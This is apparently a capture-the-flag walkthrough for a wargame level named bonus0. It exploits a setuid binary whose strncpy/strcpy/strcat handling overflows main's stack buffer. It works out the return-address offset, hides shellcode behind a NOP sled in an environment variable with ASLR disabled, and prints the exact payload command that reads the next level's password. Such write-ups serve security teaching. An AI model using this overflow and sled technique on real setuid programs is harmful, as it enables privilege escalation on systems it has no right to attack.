bonus0 - walkthrough
====================

Target: /home/user/bonus0/bonus0   (setuid + setgid bonus1)
Goal:   read /home/user/bonus1/.pass

1. Recon (objdump -d bonus0)
   p(dest, prompt):
     read(0, buf[4096]);  strchr(buf,'\n') -> '\0';  strncpy(dest, buf, 20)
     -> strncpy copies EXACTLY 20 bytes and does not NUL-terminate.
   pp(dest):
     char a[20], b[20];   // adjacent (ebp-0x30, ebp-0x1c)
     p(a," - "); p(b," - ");
     strcpy(dest, a);              // a not terminated -> spills into b
     dest[strlen(dest)] = ' ';     // 2-byte separator " " (word @ 0x80486a4)
     strcat(dest, b);
   main(): passes a ~42-byte stack buffer to pp(), then puts() it.

2. The bug
   Two 20-byte inputs are concatenated into main's small buffer with no size
   check, overflowing the saved return address.

   IMPORTANT: p() uses read(), which grabs everything available at once. The
   two prompts are separate reads, so the two lines must be sent with a short
   pause between them, otherwise the first read() eats both and the second
   read() gets EOF (crash in strchr).

3. Find the offset
   input1 = "A"*20 ,  input2 = "BBBBCCCCDDDDEEEEFFFF..."  (pause between)
     -> EIP = 0x45444444 ("DDDE")
   Locating that in input2 shows the return address occupies input2[9..12].

4. Shellcode placement (ASLR is off: randomize_va_space = 0)
   The inputs are far too small for shellcode, so we stash it in an environment
   variable behind a big NOP sled and return into the sled:
     EGG = "\x90"*500 + execve("/bin//sh","-c","/bin/cat /home/user/bonus1/.pass")
   Under gdb the sled was found spanning ~0xbffffc82 upward; returning to
   0xbffffd80 (mid-sled) is safe (bytes 80 fd ff bf: no NUL, no '\n').

5. Payload
   input1 = "A"*20                                  (keeps the offset at 9)
   input2 = "A"*9 + \x80\xfd\xff\xbf + "A"*7         (ret at offset 9)

     export EGG="$(python -c 'print "\x90"*500 + "<shellcode>"')"
     ( printf 'AAAAAAAAAAAAAAAAAAAA\n'; sleep 1;
       printf 'AAAAAAAAA\x80\xfd\xff\xbfAAAAAAA\n'; sleep 1 ) | ./bonus0

   Returning into the sled runs the shellcode, which cats the flag.

